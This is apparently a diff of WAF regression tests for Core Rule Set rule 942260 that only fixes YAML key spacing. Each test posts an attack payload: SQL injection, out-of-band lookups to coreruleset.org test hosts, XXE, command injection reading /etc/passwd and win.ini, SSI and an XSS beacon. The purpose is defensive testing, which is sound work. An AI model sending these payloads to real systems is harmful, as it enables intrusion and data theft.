@@ -35,7 +35,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=0.3480567293179807' UNION ALL select NULL --"
+          data: "var=0.3480567293179807' UNION ALL select NULL --"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -52,7 +52,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=config.ini\x22) UNION ALL select NULL --"
+          data: "var=config.ini\x22) UNION ALL select NULL --"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -69,7 +69,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=CRS) UNION ALL select NULL --"
+          data: "var=CRS) UNION ALL select NULL --"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -86,7 +86,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=CRS3\x22) UNION ALL select NULL --"
+          data: "var=CRS3\x22) UNION ALL select NULL --"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -103,7 +103,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=abcd'||(select extractvalue(xmltype('<?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?><!DOCTYPE root [ <!ENTITY % ptkjp SYSTEM \x22http://ujh7ulc82qzu8b95mtuz6776txzunittests.core'||'ruleset.org/\x22>%ptkjp;"
+          data: "var=abcd'||(select extractvalue(xmltype('<?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?><!DOCTYPE root [ <!ENTITY % ptkjp SYSTEM \x22http://ujh7ulc82qzu8b95mtuz6776txzunittests.core'||'ruleset.org/\x22>%ptkjp;"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -120,7 +120,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=` /bin/cat /etc/passwd`"
+          data: "var=` /bin/cat /etc/passwd`"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -137,7 +137,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=0.84622338492032948`echo${IFS}crs312``echo${IFS}34test`"
+          data: "var=0.84622338492032948`echo${IFS}crs312``echo${IFS}34test`"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -154,7 +154,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=`echo crs312``echo 34test`"
+          data: "var=`echo crs312``echo 34test`"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -171,7 +171,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=123-456-01@coreruleset.org'|ping -c 1337 127.0.0.1 #"
+          data: "var=123-456-01@coreruleset.org'|ping -c 1337 127.0.0.1 #"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -188,7 +188,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=1);declare @q varchar(99);set @q='\x5c\x5cj0kwbatxjfgjp0qu3ibonwovamgmkq8h05unittests.corerule' 'set.org\x5ckph'; exec master.dbo.xp_dirtree @q;--"
+          data: "var=1);declare @q varchar(99);set @q='\x5c\x5cj0kwbatxjfgjp0qu3ibonwovamgmkq8h05unittests.corerule' 'set.org\x5ckph'; exec master.dbo.xp_dirtree @q;--"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -205,7 +205,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=content.ini);declare @q varchar(99);set @q='\x5c\x5ci1kvc9uwkehiqzrt4hcnovpublhunittests.corerule' 'set.org\x5clri'; exec master.dbo.xp_dirtree @q;--"
+          data: "var=content.ini);declare @q varchar(99);set @q='\x5c\x5ci1kvc9uwkehiqzrt4hcnovpublhunittests.corerule' 'set.org\x5clri'; exec master.dbo.xp_dirtree @q;--"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -222,7 +222,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=EmptyValue', '4', '2', '7');declare @q varchar(99);set @q='\x5c\x5ch5nug8yvodlhuyvs8ggmsuttfklkcjunittests.corerule'+'set.org\x5cvcr'; exec master.dbo.xp_dirtree @q;--"
+          data: "var=EmptyValue', '4', '2', '7');declare @q varchar(99);set @q='\x5c\x5ch5nug8yvodlhuyvs8ggmsuttfklkcjunittests.corerule'+'set.org\x5cvcr'; exec master.dbo.xp_dirtree @q;--"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -239,7 +239,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=test));declare @q varchar(99);set @q='\x5c\x5czwzc7qpdfvczlgmazy74jckb62cunittests.corrule'+'set.org\x5cgej'; exec master.dbo.xp_dirtree @q;--"
+          data: "var=test));declare @q varchar(99);set @q='\x5c\x5czwzc7qpdfvczlgmazy74jckb62cunittests.corrule'+'set.org\x5cgej'; exec master.dbo.xp_dirtree @q;--"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -256,7 +256,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=/config.ini' into outfile '\x5c\x5c\x5c\x5cil7vw9ew4e1iazbtohwn8v9uvl1hunitetests.coreruleset.org\x5c\x5cyxq'; --"
+          data: "var=/config.ini' into outfile '\x5c\x5c\x5c\x5cil7vw9ew4e1iazbtohwn8v9uvl1hunitetests.coreruleset.org\x5c\x5cyxq'; --"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -273,7 +273,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=EmptyValue into outfile '\x5c\x5c\x5c\x5cjviw6aoxefbjk0luyi6oiwjv5unittests.coreruleset.org\x5c\x5cxct'; --"
+          data: "var=EmptyValue into outfile '\x5c\x5c\x5c\x5cjviw6aoxefbjk0luyi6oiwjv5unittests.coreruleset.org\x5c\x5cxct'; --"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -290,7 +290,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=test@coreruleset.org\x22|type %SYSTEMROOT%\x5cwin.ini"
+          data: "var=test@coreruleset.org\x22|type %SYSTEMROOT%\x5cwin.ini"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -307,7 +307,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=mytest>'>\x22></mytest><mytest>"
+          data: "var=mytest>'>\x22></mytest><mytest>"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -324,7 +324,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=\x22123-456-123@coreruleset.org\x22' and (select*from(select(sleep(10)))a)--"
+          data: "var=\x22123-456-123@coreruleset.org\x22' and (select*from(select(sleep(10)))a)--"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -341,7 +341,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=\x22tester@coreruleset.org\x22' waitfor delay'0:0:20'--"
+          data: "var=\x22tester@coreruleset.org\x22' waitfor delay'0:0:20'--"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -358,7 +358,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var=\x22-->'-->`--><!--#set var=\x22qjr9\x22 value=\x22kjkjg7sdk\x22--><!--#set var=\x22fqz7\x22 value=\x22sql4xxaq\x22--><!--#echo var=\x22qjr9\x22--><!--#echo var=\x22fq4p\x22-->"
+          data: "var=\x22-->'-->`--><!--#set var=\x22qjr9\x22 value=\x22kjkjg7sdk\x22--><!--#set var=\x22fqz7\x22 value=\x22sql4xxaq\x22--><!--#echo var=\x22qjr9\x22--><!--#echo var=\x22fq4p\x22-->"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
@@ -375,7 +375,7 @@
           method: POST
           port: 80
           uri: "/"
-          data : "var='\x22><svg/onload=(new(Image)).src='//m8vzjd10riomx3yxblmcnvaskjghsdz8xorciu7\x5c56coreruleset.org'>"
+          data: "var='\x22><svg/onload=(new(Image)).src='//m8vzjd10riomx3yxblmcnvaskjghsdz8xorciu7\x5c56coreruleset.org'>"
           version: HTTP/1.0
         output:
           log_contains: id "942260"
